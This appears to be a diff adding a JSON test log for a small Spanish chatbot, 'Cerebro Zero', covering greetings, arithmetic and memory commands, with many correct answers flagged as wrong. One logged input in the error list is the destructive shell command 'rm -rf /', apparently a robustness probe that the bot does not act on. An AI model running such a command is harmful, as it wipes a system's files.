+      "entrada": "recuerda learn_key_5 = learn_val_5",
+      "salida": "\u2705 Guardado: learn_key_5 = learn_val_5",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.734514"
+    },
+    {
+      "entrada": "recordar learn_key_5",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_5 = learn_val_5",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.742100"
+    },
+    {
+      "entrada": "aprende test_6",
+      "salida": "\ud83c\udf93 Aprendido: test_6",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.764664"
+    },
+    {
+      "entrada": "recuerda learn_key_6 = learn_val_6",
+      "salida": "\u2705 Guardado: learn_key_6 = learn_val_6",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.786953"
+    },
+    {
+      "entrada": "recordar learn_key_6",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_6 = learn_val_6",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.794370"
+    },
+    {
+      "entrada": "aprende test_7",
+      "salida": "\ud83c\udf93 Aprendido: test_7",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.816662"
+    },
+    {
+      "entrada": "recuerda learn_key_7 = learn_val_7",
+      "salida": "\u2705 Guardado: learn_key_7 = learn_val_7",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.839540"
+    },
+    {
+      "entrada": "recordar learn_key_7",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_7 = learn_val_7",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.847544"
+    },
+    {
+      "entrada": "aprende test_8",
+      "salida": "\ud83c\udf93 Aprendido: test_8",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.871578"
+    },
+    {
+      "entrada": "recuerda learn_key_8 = learn_val_8",
+      "salida": "\u2705 Guardado: learn_key_8 = learn_val_8",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.894873"
+    },
+    {
+      "entrada": "recordar learn_key_8",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_8 = learn_val_8",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.902256"
+    },
+    {
+      "entrada": "aprende test_9",
+      "salida": "\ud83c\udf93 Aprendido: test_9",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.925651"
+    },
+    {
+      "entrada": "recuerda learn_key_9 = learn_val_9",
+      "salida": "\u2705 Guardado: learn_key_9 = learn_val_9",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.949342"
+    },
+    {
+      "entrada": "recordar learn_key_9",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_9 = learn_val_9",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.957069"
+    },
+    {
+      "entrada": "aprende nuevo_0",
+      "salida": "\ud83c\udf93 Aprendido: nuevo_0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.981105"
+    },
+    {
+      "entrada": "recuerda learn_key_100 = learn_val_100",
+      "salida": "\u2705 Guardado: learn_key_100 = learn_val_100",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.005652"
+    },
+    {
+      "entrada": "recordar learn_key_100",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_100 = learn_val_100",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.013437"
+    },
+    {
+      "entrada": "aprende nuevo_3",
+      "salida": "\ud83c\udf93 Aprendido: nuevo_3",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.037767"
+    },
+    {
+      "entrada": "recuerda learn_key_101 = learn_val_101",
+      "salida": "\u2705 Guardado: learn_key_101 = learn_val_101",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.063178"
+    },
+    {
+      "entrada": "recordar learn_key_101",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_101 = learn_val_101",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.071519"
+    },
+    {
+      "entrada": "aprende nuevo_6",
+      "salida": "\ud83c\udf93 Aprendido: nuevo_6",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.097869"
+    },
+    {
+      "entrada": "recuerda learn_key_102 = learn_val_102",
+      "salida": "\u2705 Guardado: learn_key_102 = learn_val_102",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.124494"
+    },
+    {
+      "entrada": "recordar learn_key_102",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_102 = learn_val_102",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.132706"
+    },
+    {
+      "entrada": "aprende nuevo_9",
+      "salida": "\ud83c\udf93 Aprendido: nuevo_9",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.159174"
+    },
+    {
+      "entrada": "recuerda learn_key_103 = learn_val_103",
+      "salida": "\u2705 Guardado: learn_key_103 = learn_val_103",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.185810"
+    },
+    {
+      "entrada": "recordar learn_key_103",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_103 = learn_val_103",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.193937"
+    },
+    {
+      "entrada": "aprende nuevo_12",
+      "salida": "\ud83c\udf93 Aprendido: nuevo_12",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.220231"
+    },
+    {
+      "entrada": "recuerda learn_key_104 = learn_val_104",
+      "salida": "\u2705 Guardado: learn_key_104 = learn_val_104",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.247857"
+    },
+    {
+      "entrada": "recordar learn_key_104",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_104 = learn_val_104",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.256399"
+    },
+    {
+      "entrada": "aprende nuevo_15",
+      "salida": "\ud83c\udf93 Aprendido: nuevo_15",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.284125"
+    },
+    {
+      "entrada": "recuerda learn_key_105 = learn_val_105",
+      "salida": "\u2705 Guardado: learn_key_105 = learn_val_105",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.312240"
+    },
+    {
+      "entrada": "recordar learn_key_105",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_105 = learn_val_105",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.320784"
+    },
+    {
+      "entrada": "aprende nuevo_18",
+      "salida": "\ud83c\udf93 Aprendido: nuevo_18",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.348527"
+    },
+    {
+      "entrada": "recuerda learn_key_106 = learn_val_106",
+      "salida": "\u2705 Guardado: learn_key_106 = learn_val_106",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.377245"
+    },
+    {
+      "entrada": "recordar learn_key_106",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_106 = learn_val_106",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.385627"
+    },
+    {
+      "entrada": "aprende nuevo_21",
+      "salida": "\ud83c\udf93 Aprendido: nuevo_21",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.415156"
+    },
+    {
+      "entrada": "recuerda learn_key_107 = learn_val_107",
+      "salida": "\u2705 Guardado: learn_key_107 = learn_val_107",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.444577"
+    },
+    {
+      "entrada": "recordar learn_key_107",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_107 = learn_val_107",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.452896"
+    },
+    {
+      "entrada": "aprende nuevo_24",
+      "salida": "\ud83c\udf93 Aprendido: nuevo_24",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.481461"
+    },
+    {
+      "entrada": "recuerda learn_key_108 = learn_val_108",
+      "salida": "\u2705 Guardado: learn_key_108 = learn_val_108",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.509627"
+    },
+    {
+      "entrada": "recordar learn_key_108",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_108 = learn_val_108",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.517821"
+    },
+    {
+      "entrada": "aprende nuevo_27",
+      "salida": "\ud83c\udf93 Aprendido: nuevo_27",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.546581"
+    },
+    {
+      "entrada": "recuerda learn_key_109 = learn_val_109",
+      "salida": "\u2705 Guardado: learn_key_109 = learn_val_109",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.575772"
+    },
+    {
+      "entrada": "recordar learn_key_109",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_109 = learn_val_109",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.584108"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.0. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:08:33.012253"
+    },
+    {
+      "entrada": "adi\u00f3s",
+      "salida": "\u00a1Hasta luego! Ha sido un placer.",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:08:33.039074"
+    },
+    {
+      "entrada": "qu\u00e9 es la ia",
+      "salida": "La inteligencia artificial es un campo de la computaci\u00f3n que busca crear sistemas capaces de aprender.",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:08:33.066607"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:08:47.242305"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 + 3?",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:08:47.608398"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:08:47.930187"
+    },
+    {
+      "entrada": "test",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:08:48.472134"
+    },
+    {
+      "entrada": "test",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:08:48.749772"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:08:49.038827"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.0. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:09:49.777276"
+    },
+    {
+      "entrada": "adi\u00f3s",
+      "salida": "\u00a1Hasta luego! Ha sido un placer.",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:09:49.787131"
+    },
+    {
+      "entrada": "qu\u00e9 es la ia",
+      "salida": "La inteligencia artificial es un campo de la computaci\u00f3n que busca crear sistemas capaces de aprender.",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:09:49.797402"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:02.422881"
+    },
+    {
+      "entrada": "5 + 3",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:02.435342"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 + 3?",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:02.490674"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:02.504196"
+    },
+    {
+      "entrada": "test",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:02.522018"
+    },
+    {
+      "entrada": "test",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:02.537213"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:02.561427"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 + 3?",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:02.579401"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:10:02",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:02.590189"
+    },
+    {
+      "entrada": "adi\u00f3s",
+      "salida": "\u00a1Hasta luego! Ha sido un placer.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:02.601624"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.0. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:48.881503"
+    },
+    {
+      "entrada": "adi\u00f3s",
+      "salida": "\u00a1Hasta luego! Ha sido un placer.",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:48.891769"
+    },
+    {
+      "entrada": "qu\u00e9 es la ia",
+      "salida": "La inteligencia artificial es un campo de la computaci\u00f3n que busca crear sistemas capaces de aprender.",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:48.902413"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:11:02.342940"
+    },
+    {
+      "entrada": "5 + 3",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:11:02.354964"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 + 3?",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:11:02.411046"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:11:02.424777"
+    },
+    {
+      "entrada": "test",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:11:02.443135"
+    },
+    {
+      "entrada": "test",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:11:02.458498"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:11:02.481341"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 + 3?",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:11:02.499272"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:11:02",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:11:02.510534"
+    },
+    {
+      "entrada": "adi\u00f3s",
+      "salida": "\u00a1Hasta luego! Ha sido un placer.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:11:02.521541"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.0. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:36.827538"
+    },
+    {
+      "entrada": "adi\u00f3s",
+      "salida": "\u00a1Hasta luego! Ha sido un placer.",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:36.837950"
+    },
+    {
+      "entrada": "qu\u00e9 es la ia",
+      "salida": "La inteligencia artificial es un campo de la computaci\u00f3n que busca crear sistemas capaces de aprender.",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:36.849390"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:49.816847"
+    },
+    {
+      "entrada": "5 + 3",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:49.829000"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 + 3?",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:49.878597"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:49.892782"
+    },
+    {
+      "entrada": "test",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:49.911219"
+    },
+    {
+      "entrada": "test",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:49.926955"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:49.950803"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 + 3?",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:49.968543"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:12:49",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:49.980609"
+    },
+    {
+      "entrada": "adi\u00f3s",
+      "salida": "\u00a1Hasta luego! Ha sido un placer.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:49.991786"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.0. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:00.945444"
+    },
+    {
+      "entrada": "adi\u00f3s",
+      "salida": "\u00a1Hasta luego! Ha sido un placer.",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:00.960682"
+    },
+    {
+      "entrada": "qu\u00e9 es la ia",
+      "salida": "La inteligencia artificial es un campo de la computaci\u00f3n que busca crear sistemas capaces de aprender.",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:00.971706"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:14.162110"
+    },
+    {
+      "entrada": "5 + 3",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:14.177177"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 + 3?",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:14.244410"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:14.259113"
+    },
+    {
+      "entrada": "test",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:14.277778"
+    },
+    {
+      "entrada": "test",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:14.294118"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:14.318263"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 + 3?",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:14.330670"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:17:14",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:14.344434"
+    },
+    {
+      "entrada": "adi\u00f3s",
+      "salida": "\u00a1Hasta luego! Ha sido un placer.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:14.357077"
+    }
+  ],
+  "errores": [
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.742648"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 + 3?",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.747921"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 10 * 7?",
+      "salida": "10.0 * 7.0 = 70.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.750136"
+    },
+    {
+      "entrada": "recordar color",
+      "salida": "\ud83d\udcad Recuerdo: color = azul",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.761685"
+    },
+    {
+      "entrada": "recordar nombre",
+      "salida": "\ud83d\udcad Recuerdo: nombre = Manuel",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.771339"
+    },
+    {
+      "entrada": "aprende a programar en python",
+      "salida": "\ud83c\udf93 Aprendido: a programar en python",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.779361"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:06:48",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.784367"
+    },
+    {
+      "entrada": "dime la hora",
+      "salida": "\ud83d\udd50 15:06:48",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.786050"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 fecha es hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.788394"
+    },
+    {
+      "entrada": "qu\u00e9 es la ia",
+      "salida": "\u2753 No recuerdo 'la'",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.791547"
+    },
+    {
+      "entrada": "adi\u00f3s",
+      "salida": "\u00a1Hasta luego! Ha sido un placer.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.794099"
+    },
+    {
+      "entrada": "rm -rf /",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.798180"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 2 + 3?",
+      "salida": "2.0 + 3.0 = 5.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.168281"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 - 4?",
+      "salida": "5.0 - 4.0 = 1.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.169584"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 3 * 3?",
+      "salida": "3.0 * 3.0 = 9.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.170396"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 10 / 2?",
+      "salida": "10.0 / 2.0 = 5.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.171170"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 1 + 1?",
+      "salida": "1.0 + 1.0 = 2.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.172046"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 7 + 3?",
+      "salida": "7.0 + 3.0 = 10.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.172896"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 8 - 2?",
+      "salida": "8.0 - 2.0 = 6.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.173783"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 4 * 4?",
+      "salida": "4.0 * 4.0 = 16.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.174900"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 2 + 3?",
+      "salida": "2.0 + 3.0 = 5.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.176053"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 - 4?",
+      "salida": "5.0 - 4.0 = 1.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.177130"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 3 * 3?",
+      "salida": "3.0 * 3.0 = 9.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.178180"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 10 / 2?",
+      "salida": "10.0 / 2.0 = 5.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.179224"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 1 + 1?",
+      "salida": "1.0 + 1.0 = 2.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.180385"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 7 + 3?",
+      "salida": "7.0 + 3.0 = 10.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.181497"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 8 - 2?",
+      "salida": "8.0 - 2.0 = 6.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.182579"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 4 * 4?",
+      "salida": "4.0 * 4.0 = 16.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.183732"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 2 + 3?",
+      "salida": "2.0 + 3.0 = 5.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.184930"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 - 4?",
+      "salida": "5.0 - 4.0 = 1.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.186148"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 3 * 3?",
+      "salida": "3.0 * 3.0 = 9.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.187349"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 10 / 2?",
+      "salida": "10.0 / 2.0 = 5.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.188667"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 1 + 1?",
+      "salida": "1.0 + 1.0 = 2.0",
+      "correcto": false,
+      "feedback": null,
